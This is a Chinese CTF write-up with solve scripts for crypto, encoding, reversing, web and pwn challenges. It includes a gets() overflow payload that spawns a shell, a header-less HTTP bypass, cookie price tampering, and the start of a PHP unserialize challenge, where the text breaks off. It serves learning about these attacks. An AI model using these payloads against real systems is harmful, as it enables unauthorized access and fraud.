# 來打 CTF 囉
## Twins
Rem and Ram are twins, so of course, they're using twin primes when generating the public key.

output.txt:
```
N = 28265512785148668054687043164424479693022518403222612488086445701689124273153696780242227509530772578907204832839238806308349909883785833919803783017981782039457779890719524768882538916689390586069021017913449495843389734501636869534811161705302909526091341688003633952946690251723141803504236229676764434381120627728396492933432532477394686210236237307487092128430901017076078672141054391434391221235250617521040574175917928908260464932759768756492640542972712185979573153310617473732689834823878693765091574573705645787115368785993218863613417526550074647279387964173517578542035975778346299436470983976879797185599
e = 65537
C = 1234497647123308288391904075072934244007064896189041550178095227267495162612272877152882163571742252626259268589864910102423177510178752163223221459996160714504197888681222151502228992956903455786043319950053003932870663183361471018529120546317847198631213528937107950028181726193828290348098644533807726842037434372156999629613421312700151522193494400679327751356663646285177221717760901491000675090133898733612124353359435310509848314232331322850131928967606142771511767840453196223470254391920898879115092727661362178200356905669261193273062761808763579835188897788790062331610502780912517243068724827958000057923
```

chal.py:
```
from Crypto.Util.number import *
from secret import FLAG

def generate_twin_prime(N:int):
    while True:
        p = getPrime(N)
        if isPrime(p + 2): return p, p + 2


p, q = generate_twin_prime(1024)
N = p * q
e = 0x10001
m = bytes_to_long(FLAG)
C = pow(m, e, N)

print(f"{N = }")
print(f"{e = }")
print(f"{C = }")
```

而根據加密邏輯`C = pow(m, e, N)` （m 是 FLAG 的 bytes_to_long(FLAG)）
現在的任務是根據 N, e, C 還原 m，也就是還原 FLAG。解法：從 N 開始做開根號，逆推出 p。
```
from Crypto.Util.number import *
from math import isqrt

N = 28265512785148668054687043164424479693022518403222612488086445701689124273153696780242227509530772578907204832839238806308349909883785833919803783017981782039457779890719524768882538916689390586069021017913449495843389734501636869534811161705302909526091341688003633952946690251723141803504236229676764434381120627728396492933432532477394686210236237307487092128430901017076078672141054391434391221235250617521040574175917928908260464932759768756492640542972712185979573153310617473732689834823878693765091574573705645787115368785993218863613417526550074647279387964173517578542035975778346299436470983976879797185599
e = 65537
C = 1234497647123308288391904075072934244007064896189041550178095227267495162612272877152882163571742252626259268589864910102423177510178752163223221459996160714504197888681222151502228992956903455786043319950053003932870663183361471018529120546317847198631213528937107950028181726193828290348098644533807726842037434372156999629613421312700151522193494400679327751356663646285177221717760901491000675090133898733612124353359435310509848314232331322850131928967606142771511767840453196223470254391920898879115092727661362178200356905669261193273062761808763579835188897788790062331610502780912517243068724827958000057923

# 解出 p 和 q
p = isqrt(N - 1)
while p * (p + 2) != N:
    p -= 1
q = p + 2

# 私鑰 d
phi = (p - 1) * (q - 1)
d = inverse(e, phi)

# 解密
m = pow(C, d, N)
flag = long_to_bytes(m)

print(flag.decode())
```
**Flag: THJCC{7wIn_pR!me$_4RE_Too_L0VE1Y}**

## Frequency Freakout
cypher.txt:
```
MW RUB LGSEC GN TEYDDMTYE TSZJRGASYJUZ, IYWZ BWRUFDMYDRD XBAMW LMRU DMIJEB DFXDRMRFRMGW TMJUBSD. RUBDB XYDMT RBTUWMHFBD CBIGWDRSYRB RUB VFEWBSYXMEMRZ GN EBRRBS NSBHFBWTZ YWC DUGL UGL TBSRYMW JYRRBSWD TYW SBVBYE UMCCBW IBDDYABD.

GWB GN RUB IGDR BPTMRMWA BPBSTMDBD MW EBYSWMWA YXGFR TMJUBSD MD RSZMWA RG TGWDRSFTR ZGFS GLW YWC TUYEEBWAB GRUBSD RG XSBYQ MR. LUMEB IGCBSW BWTSZJRMGW IBRUGCD UYVB NYS DFSJYDDBC RUBDB RBTUWMHFBD MW TGIJEBPMRZ YWC DRSBWARU, RUB NFWCYIBWRYE MCBYD SBIYMW NYDTMWYRMWA.

MN ZGF'SB FJ NGS Y JFOOEB, UBSB'D Y TUYEEBWAB: RUKTT{DFXDR1R1GW_TMJU3S_1D_TGG1} -K RUMD IMAUR EGGQ EMQB Y SYWCGI DRSMWA, XFR MR'D WGR. UMCCBW LMRUMW RUMD DBHFBWTB MD RUB QBZ RG FWCBSDRYWCMWA UGL DMIJEB EBRRBS DFXDRMRFRMGW TYW DRMEE DJYSQ TFSMGDMRZ YWC NFW.

RSZ CBTGCMWA MR GS BIXBCCMWA MR LMRUMW ZGFS GLW TMJUBS. LUG QWGLD? ZGF IMAUR KFDR MWDJMSB DGIBGWB BEDB RG CMVB MWRG RUB LGSEC GN TSZJRYWYEZDMD.
```
Hint: substitution
根據提示推測這段密文看起來是經過**簡單替換加密（Substitution Cipher）**處理過的，並且很可能是**單一字母對應加密（Monoalphabetic Substitution Cipher）**。這類型的加密方式其實常出現在 CTF 題目中，也稱為凱薩加密變形或簡單替換密碼。
用 [quipqiup](https://quipqiup.com/) 這個網站解出答案。

**Flag: THJCC{SUBST1T1ON_CIPH3R_1S_COO1}**

## DAES
chal.py:
```
#!/usr/bin/python3
from Crypto.Cipher import AES
from secret import FLAG
import random
import os
import signal

TIMEOUT = 120

def timeout_handler(signum, frame):
    print("\nTime's up! No flag for u...")
    exit()

signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(TIMEOUT)

target = os.urandom(16)

keys = [b'whalekey:' + str(random.randrange(1000000, 1999999)).encode() for _ in range(2)]

def enc(key, msg):
    ecb = AES.new(key, AES.MODE_ECB)
    return ecb.encrypt(msg)

def daes(msg):
    tmp = enc(keys[0], msg)
    return enc(keys[1], tmp)

test = b'you are my fire~'
print(daes(test).hex())
print(daes(target).hex())

ans = input("Ans:")

if ans == target.hex():
    print(FLAG)
else:
    print("Nah, no flag for u...")

signal.alarm(0)
```
這是一個使用雙層 AES 加密來考驗逆推密文的題目。主要流程是：
1. 隨機產生一個 16 bytes 的密文 target
2. 用兩個隨機 key 進行兩次 AES ECB 模式加密（雙重加密）
3. 顯示一個測試字串 test 和 target 經過雙重加密的結果
4. 要求輸入 target 的原始明文

因此先在終端機執行
```
(base) kql@Kclins-MacBook-Air ~ % nc chal.ctf.scint.org 12003
8c03e8360e9b753a4b07a02d5c4f5624
efa87975b86e8e6c8911199b140f047f
```
拿到兩個隨機key後執行以下 Python 檔案
```
from Crypto.Cipher import AES
from itertools import product
import random

# 把這兩個值改成題目執行時看到的值
daes_test_hex = '8c03e8360e9b753a4b07a02d5c4f5624'
daes_target_hex = 'efa87975b86e8e6c8911199b140f047f'

# --- Known plaintext ---
test_plain = b'you are my fire~'

# --- Key 範圍 ---
# 因為 key 是 b'whalekey:' + str(num)，num 範圍是 1000000 ~ 1999999
def gen_key(num):
    return b'whalekey:' + str(num).encode()

# --- AES ECB Encrypt ---
def enc(key, msg):
    return AES.new(key, AES.MODE_ECB).encrypt(msg)

# --- AES ECB Decrypt ---
def dec(key, msg):
    return AES.new(key, AES.MODE_ECB).decrypt(msg)

# --- Stage 1: 前向映射 ---
print('[*] Building forward table...')
forward_table = {}
for num in range(1000000, 2000000):
    k1 = gen_key(num)
    try:
        mid = enc(k1, test_plain)
        forward_table[mid] = k1
    except:
        continue

# --- Stage 2: 後向對比 ---
print('[*] Searching for key pair...')
daes_test_bytes = bytes.fromhex(daes_test_hex)

for num in range(1000000, 2000000):
    k2 = gen_key(num)
    try:
        mid = dec(k2, daes_test_bytes)
        if mid in forward_table:
            k1 = forward_table[mid]
            print(f'[+] Found keys:')
            print(f'    key1 = {k1}')
            print(f'    key2 = {k2}')
            
            # Use the keys to decrypt daes(target)
            target_cipher = bytes.fromhex(daes_target_hex)
            mid2 = dec(k2, target_cipher)
            target_plain = dec(k1, mid2)
            print(f'[+] Original target plaintext (hex): {target_plain.hex()}')
            print(f'[+] Original target plaintext (bytes): {target_plain}')
            break
    except:
        continue
```
接著拿到 Original target plaintext (hex): c84db0b50cfb69abd5382542312b8d7a
故輸入 Ans 拿到 Flag
```
Ans:c84db0b50cfb69abd5382542312b8d7a
THJCC{see_u_again_in_the_middle}
```

## Snake
chal.py:
```
SSSSS = input()
print("".join(["!@#$%^&*(){}[]:;"[int(x, 2)] for x in [''.join(f"{ord(c):08b}" for c in SSSSS)[i:i+4] for i in range(0, len(SSSSS) * 8, 4)]]))
```
output.txt:
```
^$&:&@&}&^*$#!&@*#&^#!&^&[&;&:&*&@*%&^&%#!&[&)&]&#&[&^*$*$#!*#&^*!*%&)&[&^*$#!&;&&#!*%&(&^#!*$*^&#&;*#&%&^*##!^$&^*#*!&^&:*%&^*$#:#!%$&[&@&%&)*$*%&)&$&@&[&[*)#!*$*@*^&@&]&@*%&^*$#[#!*$&:&@&}&^*$#!&@*#&^#!&^&$*%&;*%&(&^*#&]&)&$#[#!&@&]&:&)&;*%&^#!*&&^*#*%&^&#*#&@*%&^*$#!&$&;*&&^*#&^&%#!&)&:#!&;*&&^*#&[&@*!*!&)&:&*#!*$&$&@&[&^*$#!&]*^&$&(#!&[&)&}&^#!&;*%&(&^*##!&]&^&]&#&^*#*$#!&;&&#!*%&(&^#!&**#&;*^*!#:#!%]&@&:*)#!*$*!&^&$&)&^*$#!&;&&#!*$&:&@&}&^*$#!&(&@*&&^#!*$&}*^&[&[*$#!**&)*%&(#!*$&^*&&^*#&@&[#!&]&;*#&^#!&{&;&)&:*%*$#!*%&(&@&:#!*%&(&^&)*##!&[&)*{&@*#&%#!&@&:&$&^*$*%&;*#*$#!&@&:&%#!*#&^&[&@*%&)*&&^*$#[#!&^&:&@&#&[&)&:&*#!*%&(&^&]#!*%&;#!*$**&@&[&[&;**#!*!*#&^*)#!&]*^&$&(#!&[&@*#&*&^*##!*%&(&@&:#!*%&(&^&)*##!&(&^&@&%*$#!#(&$*#&@&:&)&@&[#!&}&)&:&^*$&)*$#)#:#!^%&;#!&@&$&$&;&]&]&;&%&@*%&^#!*%&(&^&)*##!&:&@*#*#&;**#!&#&;&%&)&^*$#[#!*$&:&@&}&^*$#*#!*!&@&)*#&^&%#!&;*#&*&@&:*$#!#(*$*^&$&(#!&@*$#!&}&)&%&:&^*)*$#)#!&@*!*!&^&@*##!&;&:&^#!&)&:#!&&*#&;&:*%#!&;&&#!*%&(&^#!&;*%&(&^*##!&)&:*$*%&^&@&%#!&;&&#!*$&)&%&^#!&#*)#!*$&)&%&^#[#!&@&:&%#!&]&;*$*%#!&;&:&[*)#!&(&@*&&^#!&;&:&^#!&&*^&:&$*%&)&;&:&@&[#!&[*^&:&*#:#!^$&;&]&^#!*$*!&^&$&)&^*$#!*#&^*%&@&)&:#!&@#!*!&^&[*&&)&$#!&*&)*#&%&[&^#!**&)*%&(#!&@#!*!&@&)*##!&;&&#!*&&^*$*%&)&*&)&@&[#!&$&[&@***$#!&;&:#!&^&)*%&(&^*##!*$&)&%&^#!&;&&#!*%&(&^#!&$&[&;&@&$&@#:#!%[&)*{&@*#&%*$#!&(&@*&&^#!&)&:&%&^*!&^&:&%&^&:*%&[*)#!&^*&&;&[*&&^&%#!&^&[&;&:&*&@*%&^#!&#&;&%&)&^*$#!**&)*%&(&;*^*%#!&[&)&]&#*$#!&;*##!**&)*%&(#!&**#&^&@*%&[*)#!*#&^&%*^&$&^&%#!&[&)&]&#*$#!&@*%#!&[&^&@*$*%#!*%**&^&:*%*)#]&&&)*&&^#!*%&)&]&^*$#!*&&)&@#!&$&;&:*&&^*#&*&^&:*%#!&^*&&;&[*^*%&)&;&:#[#!&[&^&@&%&)&:&*#!*%&;#!&]&@&:*)#!&[&)&:&^&@&*&^*$#!&;&&#!&[&^&*&[&^*$*$#!&[&)*{&@*#&%*$#:#!^%&(&^*$&^#!*#&^*$&^&]&#&[&^#!*$&:&@&}&^*$#[#!&#*^*%#!*$&^*&&^*#&@&[#!&$&;&]&]&;&:#!&**#&;*^*!*$#!&;&&#!&[&^&*&[&^*$*$#!&[&)*{&@*#&%*$#!&(&@*&&^#!&^*)&^&[&)&%*$#!&@&:&%#!&^*(*%&^*#&:&@&[#!&^&@*#*$#[#!**&(&)&$&(#!*$&:&@&}&^*$#!&[&@&$&}#[#!&@&[*%&(&;*^&*&(#!*%&(&)*$#!*#*^&[&^#!&)*$#!&:&;*%#!*^&:&)*&&^*#*$&@&[#!#(*$&^&^#!%@&]*!&(&)*$&#&@&^&:&)&@#[#!%%&)&#&@&]&)&%&@&^#[#!&@&:&%#!^!*)&*&;*!&;&%&)&%&@&^#)#:#!&#&[&@&#&[&@&#&[&@#!%(&^*#&^#!&)*$#!*)&;*^*##!&&&[&@&*${#!^%%(%{%$%$*}^$%:%@%}$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*]
```
Hint: what does the snake say?

chal.py 的行為步驟：
1. 把輸入字串轉成 8-bit binary 串
```
''.join(f"{ord(c):08b}" for c in SSSSS)
```
2. 把整串二進位切成每 4 位（nibbles）
```
[i:i+4 for i in range(0, len(SSSSS) * 8, 4)]
```
3. 每 4-bit 當作一個整數，做為 lookup 索引
```
index:  0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15
char :  ! @ # $ % ^ & * ( )  {   }  [  ]  :  ;
```
也就是說這題的關鍵就是把輸入做了 4-bit per char 的映射編碼，目的是要解碼 output.txt，把原始輸入（也就是 flag）找出來！

執行以下 Python 檔案
```
charset = "!@#$%^&*(){}[]:;"
encoded = "^$&:&@&}&^*$#!&@*#&^#!&^&[&;&:&*&@*%&^&%#!&[&)&]&#&[&^*$*$#!*#&^*!*%&)&[&^*$#!&;&&#!*%&(&^#!*$*^&#&;*#&%&^*##!^$&^*#*!&^&:*%&^*$#:#!%$&[&@&%&)*$*%&)&$&@&[&[*)#!*$*@*^&@&]&@*%&^*$#[#!*$&:&@&}&^*$#!&@*#&^#!&^&$*%&;*%&(&^*#&]&)&$#[#!&@&]&:&)&;*%&^#!*&&^*#*%&^&#*#&@*%&^*$#!&$&;*&&^*#&^&%#!&)&:#!&;*&&^*#&[&@*!*!&)&:&*#!*$&$&@&[&^*$#!&]*^&$&(#!&[&)&}&^#!&;*%&(&^*##!&]&^&]&#&^*#*$#!&;&&#!*%&(&^#!&**#&;*^*!#:#!%]&@&:*)#!*$*!&^&$&)&^*$#!&;&&#!*$&:&@&}&^*$#!&(&@*&&^#!*$&}*^&[&[*$#!**&)*%&(#!*$&^*&&^*#&@&[#!&]&;*#&^#!&{&;&)&:*%*$#!*%&(&@&:#!*%&(&^&)*##!&[&)*{&@*#&%#!&@&:&$&^*$*%&;*#*$#!&@&:&%#!*#&^&[&@*%&)*&&^*$#[#!&^&:&@&#&[&)&:&*#!*%&(&^&]#!*%&;#!*$**&@&[&[&;**#!*!*#&^*)#!&]*^&$&(#!&[&@*#&*&^*##!*%&(&@&:#!*%&(&^&)*##!&(&^&@&%*$#!#(&$*#&@&:&)&@&[#!&}&)&:&^*$&)*$#)#:#!^%&;#!&@&$&$&;&]&]&;&%&@*%&^#!*%&(&^&)*##!&:&@*#*#&;**#!&#&;&%&)&^*$#[#!*$&:&@&}&^*$#*#!*!&@&)*#&^&%#!&;*#&*&@&:*$#!#(*$*^&$&(#!&@*$#!&}&)&%&:&^*)*$#)#!&@*!*!&^&@*##!&;&:&^#!&)&:#!&&*#&;&:*%#!&;&&#!*%&(&^#!&;*%&(&^*##!&)&:*$*%&^&@&%#!&;&&#!*$&)&%&^#!&#*)#!*$&)&%&^#[#!&@&:&%#!&]&;*$*%#!&;&:&[*)#!&(&@*&&^#!&;&:&^#!&&*^&:&$*%&)&;&:&@&[#!&[*^&:&*#:#!^$&;&]&^#!*$*!&^&$&)&^*$#!*#&^*%&@&)&:#!&@#!*!&^&[*&&)&$#!&*&)*#&%&[&^#!**&)*%&(#!&@#!*!&@&)*##!&;&&#!*&&^*$*%&)&*&)&@&[#!&$&[&@***$#!&;&:#!&^&)*%&(&^*##!*$&)&%&^#!&;&&#!*%&(&^#!&$&[&;&@&$&@#:#!%[&)*{&@*#&%*$#!&(&@*&&^#!&)&:&%&^*!&^&:&%&^&:*%&[*)#!&^*&&;&[*&&^&%#!&^&[&;&:&*&@*%&^#!&#&;&%&)&^*$#!**&)*%&(&;*^*%#!&[&)&]&#*$#!&;*##!**&)*%&(#!&**#&^&@*%&[*)#!*#&^&%*^&$&^&%#!&[&)&]&#*$#!&@*%#!&[&^&@*$*%#!*%**&^&:*%*)#]&&&)*&&^#!*%&)&]&^*$#!*&&)&@#!&$&;&:*&&^*#&*&^&:*%#!&^*&&;&[*^*%&)&;&:#[#!&[&^&@&%&)&:&*#!*%&;#!&]&@&:*)#!&[&)&:&^&@&*&^*$#!&;&&#!&[&^&*&[&^*$*$#!&[&)*{&@*#&%*$#:#!^%&(&^*$&^#!*#&^*$&^&]&#&[&^#!*$&:&@&}&^*$#[#!&#*^*%#!*$&^*&&^*#&@&[#!&$&;&]&]&;&:#!&**#&;*^*!*$#!&;&&#!&[&^&*&[&^*$*$#!&[&)*{&@*#&%*$#!&(&@*&&^#!&^*)&^&[&)&%*$#!&@&:&%#!&^*(*%&^*#&:&@&[#!&^&@*#*$#[#!**&(&)&$&(#!*$&:&@&}&^*$#!&[&@&$&}#[#!&@&[*%&(&;*^&*&(#!*%&(&)*$#!*#*^&[&^#!&)*$#!&:&;*%#!*^&:&)*&&^*#*$&@&[#!#(*$&^&^#!%@&]*!&(&)*$&#&@&^&:&)&@#[#!%%&)&#&@&]&)&%&@&^#[#!&@&:&%#!^!*)&*&;*!&;&%&)&%&@&^#)#:#!&#&[&@&#&[&@&#&[&@#!%(&^*#&^#!&)*$#!*)&;*^*##!&&&[&@&*${#!^%%(%{%$%$*}^$%:%@%}$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*]"

bin_str = ''
for c in encoded:
    try:
        index = charset.index(c)
        bin_str += f"{index:04b}"  # 每個轉回4-bit binary
    except ValueError:
        print(f"Error: Character '{c}' not found in charset.")
        # Handle the error appropriately, e.g., skip the character, exit, or replace it
        continue #Skip the invalid character in encoded string.

# 每8-bit一組轉回字元
flag = ''.join(chr(int(bin_str[i:i+8], 2)) for i in range(0, len(bin_str), 8))
print("解碼結果：", flag)
```
**Flag: THJCC{SNAK3333333333333333}**

## Money Overflow
chal.c:
```
#include<stdio.h>
#include<stdlib.h>

void init()
{
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

struct
{
    int id;
    char name[20];
    unsigned short money;
} customer;

void shop(int choice)
{
    switch(choice)
    {
        case 1:
            if (customer.money >= 100)
            {
                customer.money -= 100;
                printf("Here is your cake: %s", "🍰\n");
            }
            else 
                printf("Not enough money QQ\n");
            break;
        case 2:
            if (customer.money >= 50)
            {
                customer.money -= 50;
                printf("Here is your bun: %s", "🥖\n");
            }
            else 
                printf("Not enough money QQ\n");
            break;
        case 3:
            if (customer.money >= 25)
            {
                customer.money -= 25;
                printf("Here is your cookie: %s", "🍪\n");
            }
            else 
                printf("Not enough money QQ\n");
            break;
        case 4:
            if (customer.money >= 10)
            {
                customer.money -= 10;
                printf("Here is your water: %s", "💧\n");
            }
            else 
                printf("Not enough money QQ\n");
            break;
        case 5:
            if (customer.money >= 65535)
            {
                system("/bin/sh");
                exit(0);
            }
            else 
                printf("Not enough money QQ\n");
            break;
        default:
            printf("Not an available choice\n");
            break;
    }
    if (customer.money <= 0)
    {
        printf("No money QQ\n");
        exit(0);
    }
}

void main()
{
    init();
    customer.id = 1;
    customer.money = 100;
    printf("Enter your name: ");
    gets(customer.name);
    int choice; 
    while (1)
    {
        printf("1) cake 100$\n");
        printf("2) bun 50$\n");
        printf("3) cookie 25$\n");
        printf("4) water 15$\n");
        printf("5) get shell 65535$\n");
        printf("Your money : %d$\n", customer.money);
        printf("Buy > ");
        scanf("%d", &choice);
        shop(choice);
    }
}
```
程式使用 gets() 來讀取顧客名稱，這個函數容易受到緩衝區溢出攻擊，因為它不檢查輸入長度限制。而customer 結構體的內存佈局是：
1. id（整數）
2. name（20字節的字符數組）
3. money（無符號短整型 - 2字節）

目標是選擇選項5獲取shell，但這需要擁有65535美元，但我只有100美元起始資金。
首先創建生成攻擊字串的 Python 腳本。
```
import struct

# 創建有效載荷: 20個'A'加上小端序的0xFFFF (65535)
payload = b'A' * 20 + struct.pack('<H', 0xffff)

# 將結果寫入文件
with open('payload.bin', 'wb') as f:
    f.write(payload)
    # 添加選項5的選擇
    f.write(b'\n5\n')

print("已創建payload.bin文件")
```
接下來直接執行腳本，但由於`cat payload.bin | nc chal.ctf.scint.org 10001`會讓互動一直循環不停止，所以要執行`(cat payload.bin; cat) | nc chal.ctf.scint.org 10001`
之後就可購買 shell 並執行 ls -la
```
(base) kql@Kclins-MacBook-Air Desktop % (cat payload.bin; cat) | nc chal.ctf.scint.org 10001
Enter your name: 1) cake 100$
2) bun 50$
3) cookie 25$
4) water 15$
5) get shell 65535$
Your money : 65535$
Buy > 5
ls -la
total 72
drwxr-xr-x    1 root root 4096 Feb 18 07:28 .
drwxr-xr-x    1 root root 4096 Feb 18 07:28 ..
-rwxr-xr-x    1 root root    0 Feb 18 07:28 .dockerenv
lrwxrwxrwx    1 root root    7 Jan 26 02:05 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 18  2022 boot
drwxr-xr-x    5 root root  340 Feb 18 07:28 dev
drwxr-xr-x    1 root root 4096 Feb 18 07:28 etc
-rwxrwxrwx    1 chal chal   48 Jan 29 15:11 flag.txt
drwxr-xr-x    1 root root 4096 Feb 17 12:05 home
lrwxrwxrwx    1 root root    7 Jan 26 02:05 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Jan 26 02:05 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Jan 26 02:05 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Jan 26 02:05 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Jan 26 02:05 media
drwxr-xr-x    2 root root 4096 Jan 26 02:05 mnt
drwxr-xr-x    2 root root 4096 Jan 26 02:05 opt
dr-xr-xr-x 1053 root root    0 Feb 18 07:28 proc
drwx------    2 root root 4096 Jan 26 02:13 root
drwxr-xr-x    5 root root 4096 Jan 26 02:13 run
lrwxrwxrwx    1 root root    8 Jan 26 02:05 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Jan 26 02:05 srv
dr-xr-xr-x   13 root root    0 Feb 18 07:28 sys
drwxrwxrwt    1 root root 4096 Feb 17 12:05 tmp
drwxr-xr-x    1 root root 4096 Jan 26 02:05 usr
drwxr-xr-x    1 root root 4096 Jan 26 02:13 var
```
找到 flag.txt
**Flag: THJCC{Y0uR_n@mE_I$_ToO_LoO0OOO00oO0000o0O00OoNG}**

## Headless
Hint: I think robots are headless, but you are a real human, right?
檢查robots.txt文件，發現了以下內容：
```
User-Agent: *
Disallow: /hum4n-0nLy
```
訪問那個被禁止的路徑：/hum4n-0nLy
執行以下指令
```
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" http://chal.ctf.scint.org:10069/hum4n-0nLy
```
查看到以下內容
```
from flask import Flask, request, render_template, Response
from flag import FLAG
app = Flask(name)

@app.route('/')
def index():
    return render_template('index.html')
@app.route('/robots.txt')
def noindex():
    r = Response(response="User-Agent: *\nDisallow: /hum4n-0nLy\n", status=200, mimetype="text/plain")
    r.headers["Content-Type"] = "text/plain; charset=utf-8"
    return r

@app.route('/hum4n-0nLy')
def source_code():
    return open(file).read()

@app.route('/r0b07-0Nly-9e925dc2d11970c33393990e93664e9d')
def secret_flag():
    if len(request.headers) > 1:
        return "I'm sure robots are headless, but you are not a robot, right?"
    return FLAG
    
if name == 'main':
    app.run(host='0.0.0.0',port=80,debug=False）
```
發現一個隱藏的路徑 `/r0b07-0Nly-9e925dc2d11970c33393990e93664e9d`

再下指令
```
(echo -e "GET /r0b07-0Nly-9e925dc2d11970c33393990e93664e9d HTTP/1.0\r\n\r\n"; sleep 1) | nc chal.ctf.scint.org 10069
```
這個指令旨在繞過源代碼中的頭部檢查限制：
1. GET 指明我們要獲取資源
2. HTTP/1.0 是協議版本，HTTP/1.1 協議規定必須包含 Host 頭部
HTTP/1.0 不要求 Host 頭部，允許我們發送零頭部請求
3. \r\n\r\n 是兩個換行，表示HTTP頭部結束並開始請求主體
4. sleep 1 讓程序暫停1秒，目的是保持連接開啟，給服務器足夠時間處理請求並返回結果
5. 使用 netcat (nc) 工具建立到伺服器的TCP連接
將之前Echo出的HTTP請求通過管道（pipe）發送到這個連接

故可做到發送一個不包含任何HTTP頭部的請求，從而滿足源代碼中的條件 if len(request.headers) > 1，讓其返回 Flag 而不是錯誤信息。由於一般的 HTTP 客戶端（如瀏覽器或常規的curl命令）會自動添加多個頭部，所以需要使用這種低層級的方法來控制確切發送的內容。

返回 Header 拿到 Flag
```
HTTP/1.1 200 OK
Server: nginx/1.23.2
Date: Sun, 20 Apr 2025 07:57:23 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 33
Connection: close

THJCC{Rob0t_r=@lways_he@dl3ss...}
```

## 西

Hint: C language Chinese version

chal.c: 
```
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#define 掐 char
#define 伊恩窺皮特_弗雷格 enrypted_flag
#define 等於 =
#define 佛以德 void
#define 低窺皮特 decrypt
#define 哀恩踢 int
#define 小於 <
#define 恩 n
#define 佛 for
#define 哀 i
#define 加加 ++
#define 立蘿 0
#define 欸殼斯偶爾等於 ^=
#define 欸服費 0xF5
#define 面 main
#define 衣服 if
#define 欸斯踢阿鏈 strlen
#define 鋪因特欸服 printf
#define 趴欸斯 "%s"
掐 伊恩窺皮特_弗雷格[] 等於 "\xa1\xbd\xbf\xb6\xb6\x8e\xa1\x9d\xc4\x86\xaa\xc4\xa6\xaa\x9b\xc5\xa1\xaa\x9a\x97\x93\xa0\xd1\x96\xb5\xa1\xc4\xba\x9b\x88";

佛以德 低窺皮特(哀恩踢 恩)
{
    佛 (哀恩踢 哀 等於 立蘿; 哀 小於 恩; 哀 加加)
    {
        伊恩窺皮特_弗雷格[哀] 欸殼斯偶爾等於 欸服費;
    }
}

哀恩踢 面()
{
    衣服 (立蘿)
    {
        低窺皮特(欸斯踢阿鏈(伊恩窺皮特_弗雷格));
    }
    鋪因特欸服(趴欸斯, 伊恩窺皮特_弗雷格);
}
```
因此可以得出程式碼為
```
import binascii

# Encrypted flag as given in the C code
encrypted_flag = b"\xa1\xbd\xbf\xb6\xb6\x8e\xa1\x9d\xc4\x86\xaa\xc4\xa6\xaa\x9b\xc5\xa1\xaa\x9a\x97\x93\xa0\xd1\x96\xb5\xa1\xc4\xba\x9b\x88"

# Decrypt by XOR-ing each byte with 0xF5
decoded_flag = bytes(b ^ 0xF5 for b in encrypted_flag)

# Display the decrypted flag
print(decoded_flag.decode())
```
**Flag: THJCC{Th1s_1S_n0T_obfU$c@T1On}**

## APPL3 STOR3🍎

找到隱藏頁面`http://chal.ctf.scint.org:8787/items?id=87`
發現買不起 Flag ，故從 Cookie 更改 Product_Prices 的 Value 為 0

**Flag: THJCC{Appl3_st0r3_M45t3r}**

## Seems like someone’s breaking down😂

Hint: STOP ATTACK MeEeeEeEEeeE Hey you! come here! Help me to find out WHO break my door!

下載題目提供的 app.log ，其中有巨量的登入紀錄，先試著掃描一些關鍵字
```
grep -Ei 'break|door|alarm|unauthorized' app.log
```
發現還是有非常多的資料，因此再繼續篩
```
grep '172.18.0.1' app.log | grep -v '404' | grep -E 'unlock|admin|door'
```
發現其中一行的密碼有點奇怪，使用 base64 解碼

**Flag: THJCC{L0g_F0r3N51C5_1s_E45Y}**

## Python Hunter 🐍

Hint: Let’s catch python together!
先將題目給的 hunter.cpython-38.pyc 轉成 Python 檔案
```
uncompyle6 hunter.cpython-38.pyc > hunter.py
```
hunter.py:
```
# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.11.5 (main, Sep 11 2023, 08:17:37) [Clang 14.0.6 ]
# Embedded file name: hunter.py
# Compiled at: 2025-03-24 19:52:35
# Size of source mod 2**32: 655 bytes
import sys as s

def qwe(abc, xyz):
    r = []
    l = len(xyz)
    for i in range(len(abc)):
        t = chr(abc[i] ^ ord(xyz[i % l]))
        r.append(t)
    else:
        return "".join(r)


d = [48, 39, 37, 49, 28, 16, 82, 17, 87, 13, 92, 71, 104, 52, 21, 0, 83, 
 7, 95, 28, 55, 30, 11, 78, 87, 29, 18]
k = "door_key"
m = "not_a_key"

def asd(p):
    u = 42
    v = qwe(d, k)
    w = qwe(d, p)
    if w == v:
        print(f"Correct! {v}")
    else:
        print("Wrong!")


def dummy():
    return len(d) * 2 - 1


if __name__ == "__main__":
    if len(s.argv) > 1:
        asd(s.argv[1])
    else:
        print("Please provide a key as an argument.")
    dummy()

# okay decompiling hunter.cpython-38.pyc
```
其核心邏輯段落（def qwe(abc, xyz):）是一個 XOR 解密器，用 key（第二參數）解密密文 abc（這裡是 d 陣列）。v = qwe(d, k) 就是用 "door_key" 來解密 d，得到的就是正確的 flag，所以我們只要跑以下程式碼即可。
```
d = [48, 39, 37, 49, 28, 16, 82, 17, 87, 13, 92, 71, 104, 52, 21, 0, 83, 
     7, 95, 28, 55, 30, 11, 78, 87, 29, 18]
k = "door_key"

def qwe(abc, xyz):
    r = []
    l = len(xyz)
    for i in range(len(abc)):
        t = chr(abc[i] ^ ord(xyz[i % l]))
        r.append(t)
    return "".join(r)

flag = qwe(d, k)
print("Flag:", flag)
```
**Flag: THJCC{7h3b357_py7h0nhun73r}**

## Lime Ranger

網頁原始碼：
```
<?php 
session_start();

if(isset($_GET["view"])){
    show_source(__FILE__);
    exit();
}

include "flag.php";

if(!isset($_SESSION["balance"])){
    $_SESSION["balance"] = 4000;
    $_SESSION["inventory"] = array("UR" => 0, "SSR" => 0, "SR" => 0, "R" => 0, "N" => 0);
}

if(isset($_GET["bonus_code"])){
    $code = $_GET["bonus_code"];
    $new_inv = @unserialize($code);
    if(is_array($new_inv)){
        foreach($new_inv as $key => $value){
